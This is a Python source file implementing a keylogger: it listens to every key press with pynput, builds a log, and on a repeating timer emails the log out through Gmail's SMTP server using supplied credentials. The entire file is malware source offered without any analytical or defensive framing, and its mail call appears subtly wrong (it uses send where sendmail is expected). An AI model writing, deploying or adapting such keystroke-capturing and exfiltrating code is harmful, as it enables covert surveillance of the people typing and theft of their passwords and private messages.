# Imports
import pynput.keyboard
import threading
import smtplib

# Global Variables
current_key = ""


# Keylogger Class
class Keylogger:
    # Constructor
    def __init__(self, time_interval, email, password):
        # Global Variable
        self.log = "Keylogger started"
        self.interval = time_interval
        self.email = email
        self.password = password

    # Appending to log
    def append_to_log(self, string):
        self.log = self.log + string

    # Key Press Processor
    def process_key_press(self, key):
        global current_key
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        except KeyboardInterrupt:
            print("Program Terminated")

        self.append_to_log(current_key)

    # Sending E-Mail
    @staticmethod
    def send_mail(email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.send(email, email, message)
        server.quit()

    # Reporting the log
    def report(self):
        print(self.log)
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    # Start Function
    def start(self):
        # Keyboard Listener
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)

        with keyboard_listener:
            self.report()
            keyboard_listener.join()
